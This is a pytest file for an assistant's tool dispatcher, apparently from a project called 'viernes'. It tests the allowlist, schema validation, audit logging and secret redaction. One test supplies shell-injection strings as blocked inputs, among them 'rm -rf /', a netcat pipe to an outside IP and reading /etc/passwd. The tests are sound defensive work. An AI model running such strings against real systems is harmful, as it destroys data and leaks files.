import pytest
from pydantic import BaseModel

from viernes.tools.audit import sanitize_params
from viernes.tools.dispatcher import ToolDispatcher
from viernes.tools.registry import (
    OpenAppParams,
    ToolDefinition,
    ToolRegistry,
    VolumeControlParams,
)
from viernes.tools.security import SecurityViolationError


def test_allowed_tool_executes_successfully() -> None:
    registry = ToolRegistry()
    registry.register(
        ToolDefinition(
            name="system_open_app",
            description="Abre una aplicación de escritorio",
            param_schema=OpenAppParams,
            handler=lambda params: f"App {params.app_name} abierta correctamente",
        )
    )
    dispatcher = ToolDispatcher(registry=registry)
    result = dispatcher.dispatch("system_open_app", {"app_name": "spotify"})

    assert result == "App spotify abierta correctamente"
    assert len(dispatcher.audit_logger.records) == 1
    assert dispatcher.audit_logger.records[0].status == "SUCCESS"


def test_unauthorized_tool_rejected() -> None:
    registry = ToolRegistry()
    dispatcher = ToolDispatcher(registry=registry)

    with pytest.raises(
        SecurityViolationError, match="not permitted by the strict security allowlist"
    ):
        dispatcher.dispatch("unauthorized_shell_tool", {})

    assert len(dispatcher.audit_logger.records) == 1
    assert dispatcher.audit_logger.records[0].status == "REJECTED"


@pytest.mark.parametrize(
    "payload",
    [
        "spotify; rm -rf /",
        "calc && bash -i",
        "app | nc 1.2.3.4 8080",
        "eval `cat /etc/passwd`",
        "spotify $(whoami)",
        "sudo reboot",
    ],
)
def test_shell_injection_and_forbidden_binaries_blocked(payload: str) -> None:
    registry = ToolRegistry()
    registry.register(
        ToolDefinition(
            name="system_open_app",
            description="Test app launcher",
            param_schema=OpenAppParams,
            handler=lambda p: "ok",
        )
    )
    dispatcher = ToolDispatcher(registry=registry)

    with pytest.raises((SecurityViolationError, ValueError)):
        dispatcher.dispatch("system_open_app", {"app_name": payload})

    assert dispatcher.audit_logger.records[-1].status == "REJECTED"


def test_pydantic_schema_validation_error() -> None:
    registry = ToolRegistry()
    registry.register(
        ToolDefinition(
            name="system_volume_control",
            description="Ajusta el volumen",
            param_schema=VolumeControlParams,
            handler=lambda p: f"Volumen al {p.level_percent}%",
        )
    )
    dispatcher = ToolDispatcher(registry=registry)

    # Volume must be 0 <= level_percent <= 100
    with pytest.raises(ValueError, match="Parameter validation error"):
        dispatcher.dispatch("system_volume_control", {"level_percent": 150})

    assert dispatcher.audit_logger.records[-1].status == "REJECTED"


def test_audit_secret_redaction() -> None:
    params = {
        "user": "alice",
        "api_key": "secret_key_12345",
        "nested": {"token": "bearer_987", "safe_val": 42},
    }
    sanitized = sanitize_params(params)
    assert sanitized["user"] == "alice"
    assert sanitized["api_key"] == "[REDACTED]"
    assert sanitized["nested"]["token"] == "[REDACTED]"
    assert sanitized["nested"]["safe_val"] == 42


def test_dispatcher_logs_execution_failure() -> None:
    class DummyModel(BaseModel):
        msg: str

    registry = ToolRegistry(allowlist={"system_get_time"})

    def failing_handler(params: DummyModel):
        raise RuntimeError("Service temporarily down")

    registry.register(
        ToolDefinition(
            name="system_get_time",
            description="Get time",
            param_schema=DummyModel,
            handler=failing_handler,
        )
    )
    dispatcher = ToolDispatcher(registry=registry)

    with pytest.raises(RuntimeError, match="Service temporarily down"):
        dispatcher.dispatch("system_get_time", {"msg": "now"})

    assert dispatcher.audit_logger.records[-1].status == "ERROR"
